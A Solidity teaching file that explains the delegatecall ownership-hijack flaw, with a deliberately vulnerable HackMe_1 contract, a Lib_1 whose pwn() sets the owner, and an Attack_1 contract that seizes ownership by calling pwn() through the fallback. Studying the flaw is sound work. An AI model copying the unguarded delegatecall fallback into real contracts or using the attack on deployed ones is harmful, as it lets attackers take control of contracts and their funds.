// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib_1 {
    address public owner;
    event SetOwner(address _owner);

    function pwn() public {
        owner = msg.sender;
        emit SetOwner(owner);
    }
}

contract HackMe_1 {
    address public owner;
    Lib_1 public lib;
    event SetOwner(address _owner);

    constructor(Lib_1 _lib) {
        owner = msg.sender;
        lib = Lib_1(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
        emit SetOwner(owner);
    }
}

contract Attack_1 {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
